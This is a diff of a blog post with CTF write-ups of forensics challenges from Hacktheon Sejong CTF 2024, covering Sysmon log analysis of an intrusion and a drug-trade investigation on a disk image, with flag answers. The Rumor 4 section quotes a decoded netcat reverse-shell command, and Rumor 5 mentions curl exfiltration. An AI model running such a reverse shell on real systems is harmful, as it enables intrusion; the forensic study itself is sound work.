@@ -1,28 +1,28 @@
 ---
 title: Hacktheon Sejong CTF 2024 - Writeups
 time: 2024-04-27 12:00:00
-categories: [ctf]
-tags: [forensics,hacktheon]
+categories: [ctf,hacktheon]
+tags: [forensics]
 image: /assets/posts/hacktheonsejongctf2024/icon.jpg
 ---
 
 This is a writeup for all forensics challenges from Hacktheon Sejong CTF 2024. This CTF was special as I was invited by a Taiwanese player to join her team to handle forensics/misc challenges. Fortunately, I did not disappoint them as I managed to solve all the challenges easily. Shame we did not get top 20 but it was still a fun experience overall.
 
 ## Rumor 1 [Forensics]
-Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the IP address of the mail server used by the PC to be analyzed? Ex: xxx.xxx.xxx.xxx
+**Question:** I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the IP address of the mail server used by the PC to be analyzed? Ex: xxx.xxx.xxx.xxx
 
-Flag: `92.68.200.206`
+**Flag:** `92.68.200.206`
 
-We are given a single event log to investigate. Analyzing the event log, it seems to be `Sysmon` judging by the event IDs. Since the description mentioned something about mail server, filtering the event log with `SMTP` shows the IP address of the mail server.
+We are given an unknown event log to investigate. Analyzing the event log, it seems to be `Sysmon` judging by the event IDs. Since the description mentioned something about mail server, filtering the event log with `SMTP` shows the IP address of the mail server.
 
 ![one](/assets/posts/hacktheonsejongctf2024/one.png)
 
 ## Rumor 2 [Forensics]
-Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions.What is the PID of the malicious process that the attacker executed for session connection after the PC was infected?
+**Question:** I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions.What is the PID of the malicious process that the attacker executed for session connection after the PC was infected?
 
-Flag: `3868`
+**Flag:** `3868`
 
-Analyzing the event log, we can notice suspicious activity happening around 2:26 AM 14/12/2023. The user seems to be downloading `confidential.doc` file using the email client Thunderbird.
+Suspicious activity can be identified happening around `2:26 AM 14/12/2023`. The user seems to be downloading `confidential.doc` file using Thunderbird.
 
 ![two](/assets/posts/hacktheonsejongctf2024/two.png)
 
@@ -31,18 +31,18 @@ Filtering the logs with EventID 3, a netcat application can be seen executed aro
 ![three](/assets/posts/hacktheonsejongctf2024/three.png)
 
 ## Rumor 3 [Forensics]
-Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the network band scanned by the attacker for additional infections? Example: xxx.xxx.xxx.0/36
+**Question:** I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the network band scanned by the attacker for additional infections? Example: xxx.xxx.xxx.0/36
 
-Flag: `192.168.100.0/24`
+**Flag:** `192.168.100.0/24`
 
-Following the timeline, we can see the attacker running a Python script that pings a range of IP addresses after compromising the machine. The range was 192.168.100.1 to 192.168.100.255.
+Following the timeline, we can see the attacker running a Python script that pings a range of IP addresses after compromising the machine. The range was `192.168.100.1 - 192.168.100.255`.
 
 ![four](/assets/posts/hacktheonsejongctf2024/four.png)
 
 ## Rumor 4 [Forensics]
-Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What attack payload did the attacker use for the network-linked daemon on the server after the network scan? (reverse shell)
+**Question:** I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What attack payload did the attacker use for the network-linked daemon on the server after the network scan? (reverse shell)
 
-Flag: `bmMgMTkyLjE2OC4xMDAuMzIgNTQ1NCAtZSAvYmluL2Jhc2g=====`
+**Flag:** `bmMgMTkyLjE2OC4xMDAuMzIgNTQ1NCAtZSAvYmluL2Jhc2g=====`
 
 Similarly, following the timeline shows that an encoded payload was executed after enumerating the network. The decoded payload can be identified as `nc 192.168.100.32 5454 -e /bin/bash`
 
@@ -51,18 +51,18 @@ Similarly, following the timeline shows that an encoded payload was executed aft
 ![six](/assets/posts/hacktheonsejongctf2024/six.png)
 
 ## Rumor 5 [Forensics]
-Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the name of the file that the attacker finally exfiltrated? Example: exfiltration.zip
+**Question:** I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the name of the file that the attacker finally exfiltrated? Example: exfiltration.zip
 
-Flag: `secret.tar.gz`
+**Flag:** `secret.tar.gz`
 
 After establishing the reverse shell, we can see that the attacker utilized curl to exfiltrate a zip file called `secret.tar.gz`
 
 ![seven](/assets/posts/hacktheonsejongctf2024/seven.png)
 
 ## Tracker 1 [Forensics]
-Question: An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the SNS account ID of the drug seller? (string)
+**Question:** An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the SNS account ID of the drug seller? (string)
 
-Flag: `05aa64c6099f0e23345c279882edd6f73f4d20f5cc7aae2eef4874784ab4a50c77`
+**Flag:** `05aa64c6099f0e23345c279882edd6f73f4d20f5cc7aae2eef4874784ab4a50c77`
 
 We are given an AD1 image to investigate. Reading the description, it seems that I have to locate the drug seller's SNS (Social Network Service) account ID in a messaging application. Looking at common places like Desktop, Documents and AppData/Programs, a `Session` messaging application can be seen downloaded in the machine.
 
@@ -91,9 +91,9 @@ The user can be seen communicating with the seller about buying drugs and transf
 ![lol4](/assets/posts/hacktheonsejongctf2024/lol4.png)
 
 ## Tracker 2 [Forensics]
-Question: An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the main wallet address of the drug seller? (lowercase)
+**Question:** An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the main wallet address of the drug seller? (lowercase)
 
-Flag: `0xfc80b72fcc371ffd9e1a2c33d4d7c6c00d0658d2`
+**Flag:** `0xfc80b72fcc371ffd9e1a2c33d4d7c6c00d0658d2`
 
 After analyzing the AD1 image for a few hours, I found another lead in `AppData\Roaming\Windows\Recent\` where a suspicious file was run recently. Analyzing it, it seems that it was a Chrome extension.
 
@@ -130,14 +130,14 @@ Following the first transaction in the list with `0x0e2b8f5BBB714433C8Af78B3Db15
 
 ![cr2](/assets/posts/hacktheonsejongctf2024/cr2.png)
 
-Analzing the main address, the seller's account can seen receiving several transactions from different addresses and has not sent out any. Thus, proving that this was indeed the seller's main address.
+Analyzing the main address, the seller's account can seen receiving several transactions from different addresses and has not sent out any. Thus, proving that this was indeed the seller's main address.
 
 ![cr3](/assets/posts/hacktheonsejongctf2024/cr3.png)
 
 ## Tracker 3 [Forensics]
-Question: An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the hash value of the transaction where the buyer traded drugs?
+**Question:** An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the hash value of the transaction where the buyer traded drugs?
 
-Flag: `0x2485878be80df93501b8a7caa7e70b616f4c5908f1599f6f0b869ed2fbc354a4`
+**Flag:** `0x2485878be80df93501b8a7caa7e70b616f4c5908f1599f6f0b869ed2fbc354a4`
 
 Similar to Tracker 2, just take the transaction hash between the user and seller.
 
